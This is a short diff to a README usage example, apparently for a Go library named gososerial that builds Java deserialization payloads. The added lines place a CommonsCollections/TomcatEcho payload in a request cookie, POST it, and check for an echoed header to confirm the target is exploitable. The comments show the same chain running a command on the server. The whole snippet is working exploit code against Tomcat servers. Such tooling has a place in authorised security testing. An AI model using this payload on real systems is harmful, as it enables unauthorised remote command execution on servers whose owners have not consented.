@@ -60,6 +60,15 @@ TomcatEcho
 // Testecho: expr 10 '*' 10 -> expr 10 '*' 10
 // Testcmd: expr 10 '*' 10 -> 100
 payload := gososerial.GetCCK2TomcatEcho("Testecho", "Testcmd")
+
+req.Cookie = payload
+req.Header["Testecho"] = "gososerial"
+req.Method = "POST"
+resp := httputil.sendRequest(req)
+
+if resp.Header["Testecho"] == "gososerial" {
+	log.Info("find tomcat echo")
+}
 ```
 
 Example
